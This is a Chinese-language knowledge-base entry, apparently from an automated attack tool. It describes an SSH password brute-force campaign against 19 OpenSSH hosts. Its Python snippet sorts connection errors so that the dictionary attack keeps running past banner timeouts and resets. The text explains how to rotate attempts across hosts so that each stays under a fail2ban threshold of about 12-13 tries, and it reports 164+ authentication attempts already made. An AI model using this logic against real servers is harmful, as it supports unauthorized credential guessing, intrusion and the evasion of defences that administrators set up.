# SSH 批量作业「banner 抖动 vs 真防护」判据 —— 单发复验可救回被误判的整批目标

- **code**: ssh-批量作业-banner-抖动-vs-真防护-判据-单发复验可救回被误判的整批目标
- **kind**: script
- **category**: rce
- **component**: OpenSSH
- **severity**: low
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.84/24 站群 19 台 OpenSSH 7.4 上实操验证：(1) 主会话独立实测——.191 被前者按"第4组报 banner 错误 = 防护触发"停表，但我单发慢速打满 8 组全部干净 AUTH_FAIL，证明该停机是误判；(2) 本会话 v3 脚本全段作业中，banner 错误/超时出现 6+ 次，每次单发复验均立即返回 `SSH-2.0-OpenSSH_7.4`，全部判定抖动并继续，18/19 台全程健康推进 164+ 次认证无一次真防护。两次独立实测互证。
- **tags**: ssh,bruteforce,误判防护,fail2ban,抖动复验,paramiko
- **created_at**: 2026-10-15T19:37:15.484Z
- **found_by**: exploit

## 描述

批量 SSH 口令作业时，工具抛 `Error reading SSH protocol banner` / `ConnectionResetError` / `TimeoutError` 是**瞬时抖动**（NAT 表满、MaxStartups 队列满、链路抖动）还是**真防护**（fail2ban/拒绝），直接决定整批任务是继续还是误判死亡。判据：**出现该类错误先做单发复验（重新 socket connect 读 banner），只要单发能拿到 `SSH-2.0-*` 就说明服务正常，属于抖动，必须继续；只有连续 3 次单发复验都失败才判该 IP 冷却。** 另：banner 返回 `Exceeded MaxStartups` 是 sshd 连接队列满（并发过高），隔 60s 重试一次即可，不是封禁。`AuthenticationException`（AUTH_FAIL）是唯一可以确定"服务正常、口令错"的信号，应继续消耗字典。

## 用法

```
在批量口令脚本里对每次连接做如下分类处理：

```python
def classify(exc):
    # AUTH_FAIL：服务正常，口令错 —— 唯一"确定正常"的信号，继续消耗字典
    if isinstance(exc, paramiko.AuthenticationException):
        return "CONTINUE"
    # banner 错误 / RESET / TIMEOUT：疑似防护 —— 但先单发复验，不要直接停表
    if isinstance(exc, (paramiko.SSHException, ConnectionResetError,
                        socket.timeout, TimeoutError)):
        return "RECHECK"
    return "SKIP"

def alive_recheck(ip, n=3):
    """连续 n 次单发复验都拿不到 banner 才判该 IP 冷却"""
    for i in range(n):
        b = banner(ip)          # 裸 socket connect + recv(256)
        if b.startswith("SSH-2.0"):
            return True         # 抖动 —— 继续打
        time.sleep(10)
    return False                # 真防护 —— 该 IP 进冷却

# 主循环
try:
    ...connect & auth...
except paramiko.AuthenticationException:
    time.sleep(45)              # 服务正常，继续下一组口令
except Exception as e:
    if alive_recheck(ip):
        time.sleep(45)          # 复验通过 → 抖动，继续
    else:
        cooldown.add(ip)        # 连续 3 次失败 → 冷却
```

另两种 banner 的处置：
- `Exceeded MaxStartups` → sshd 队列满，`time.sleep(60)` 后重试一次
- 长期返回空 banner（连上但不发 banner 就断）→ 属真防护，跳过该 IP

实测效果：19 台全段作业中，该机制救回 6 次被老口径误判为"防护触发"的继续机会；若无复验，会把整批 19 台误判成"全部被防护"，任务直接终止。

分轮轮换配套：单台每轮只吃 9 组、跨全段轮换，使单台相邻两次尝试间隔达十几分钟，规避 fail2ban 类的连续计数阈值（实测某台阈值为同 IP 连续 12-13 次认证）。
```
